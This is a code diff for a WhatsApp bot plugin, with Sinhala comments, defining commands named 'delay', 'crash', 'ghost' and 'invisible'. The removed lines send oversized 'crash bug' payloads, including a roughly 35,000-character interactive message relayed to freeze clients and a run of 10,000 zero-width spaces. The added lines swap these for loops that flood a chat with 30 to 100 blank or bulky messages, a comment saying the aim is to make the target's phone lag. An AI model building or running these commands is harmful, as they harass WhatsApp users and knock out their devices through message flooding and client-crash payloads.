@@ -3,45 +3,43 @@ const { cmd } = require('../command');
 cmd({
     pattern: "delay",
     alias: ["lag"],
-    desc: "Send delay bug",
+    desc: "Send delay spam",
     category: "other",
     react: "🐢",
     filename: __filename
 },
 async (conn, m, { from }) => {
-    let text = 'ㅤ'.repeat(4000); 
-    await conn.sendMessage(from, { text: text + '🐢 𝐃𝐄𝐋𝐀𝐘' });
+    // 50x spam karala phone lag karanawa
+    for(let i = 0; i < 50; i++) {
+        await conn.sendMessage(from, { text: 'ㅤ' });
+    }
 });
 
 cmd({
     pattern: "crash",
     alias: ["crashbug"],
-    desc: "Send crash bug",
+    desc: "Send crash spam",
     category: "other",
     react: "💣",
     filename: __filename
 },
 async (conn, m, { from }) => {
-    // FIX: relayMessage 3rd param {} empty karala
-    const crash = {
-        interactiveMessage: {
-            body: { text: "𝐑𝐈𝐊𝐀 ".repeat(2500) }, // ~35k chars
-            nativeFlowMessage: { buttons: [] }
-        }
-    };
-    await conn.relayMessage(from, crash, {}); // <-- mehema witharai
+    // 100x big text spam
+    for(let i = 0; i < 100; i++) {
+        await conn.sendMessage(from, { text: '𝐑𝐈𝐊𝐀-𝐂𝐑𝐀𝐒𝐇 '.repeat(100) });
+    }
 });
 
 cmd({
     pattern: "ghost",
     alias: ["ghostbug"],
-    desc: "Send ghost text",
+    desc: "Send ghost spam",
     category: "other",
     react: "👻",
     filename: __filename
 },
 async (conn, m, { from }) => {
-    for(let i = 0; i < 5; i++) {
+    for(let i = 0; i < 30; i++) {
         await conn.sendMessage(from, { text: 'ㅤ' });
     }
 });
@@ -49,11 +47,13 @@ async (conn, m, { from }) => {
 cmd({
     pattern: "invisible",
     alias: ["invisiblebug", "blank"],
-    desc: "Send invisible bug",
+    desc: "Send invisible spam",
     category: "other",
     react: "🫥",
     filename: __filename
 },
 async (conn, m, { from }) => {
-    await conn.sendMessage(from, { text: '\u200B'.repeat(10000) });
+    for(let i = 0; i < 100; i++) {
+        await conn.sendMessage(from, { text: '\u200B' });
+    }
 });
